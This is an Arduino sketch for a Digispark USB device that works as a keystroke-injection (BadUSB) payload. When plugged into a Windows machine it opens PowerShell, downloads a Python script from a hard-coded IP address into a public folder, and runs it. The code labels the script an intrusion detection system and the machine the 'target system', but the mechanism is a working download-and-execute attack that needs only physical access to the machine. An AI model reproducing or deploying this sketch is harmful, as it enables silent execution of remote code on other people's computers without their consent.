#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.delay(3000);  // Wait for system to recognize device

    // Open PowerShell
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.print("powershell");
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);

    // Download the IDS script to C:\Users\Public\ids.py
    DigiKeyboard.print("Invoke-WebRequest -Uri 'http://192.168.29.48:8080/ids.py' -OutFile 'C:\\Users\\Public\\ids.py'");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);  // Wait for download to complete

    // Execute the IDS script
    DigiKeyboard.print("python C:\\Users\\Public\\ids.py");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    // Send event to IDS
    Serial.begin(9600);
    Serial.println("IDS DEPLOYED: Running IDS on target system");
}

void loop() {
    delay(100);
}
